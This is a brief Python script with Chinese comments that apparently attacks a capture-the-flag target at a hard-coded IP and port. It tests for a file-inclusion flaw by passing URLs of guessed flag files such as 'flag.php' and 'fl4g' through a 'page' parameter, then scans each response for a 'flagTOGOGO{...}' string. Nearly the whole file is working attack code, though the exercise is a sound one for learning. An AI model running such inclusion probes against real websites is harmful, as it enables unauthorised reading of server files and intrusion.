#!/usr/bin/env python3
"""
测试通过HTTP协议访问flag
"""

import requests
import re

target = "http://47.113.178.182:32827/"
base_url = "http://47.113.178.182:32827/"

# 可能的flag文件名
flag_names = [
    'flag', 'flag.txt', 'flag.php', 'flaggggggg', 'flagaaa',
    'fl4g', 'f1ag', 'secret', 'key.txt', 'flag_rfi',
    'the_flag', 'get_flag', 'flag_is_here'
]

print("[*] 测试通过HTTP协议访问flag...")

for name in flag_names:
    try:
        test_url = base_url + name
        r = requests.get(target, params={'page': test_url}, timeout=5)

        if 'flagTOGOGO{' in r.text:
            print(f"\n[+] 找到FLAG!")
            print(f"[+] URL: {test_url}")
            flags = re.findall(r'flagTOGOGO\{[^}]+\}', r.text)
            if flags:
                print(f"[+] FLAG: {flags[0]}")
                break
    except Exception as e:
        pass

print("\n[*] 测试完成")
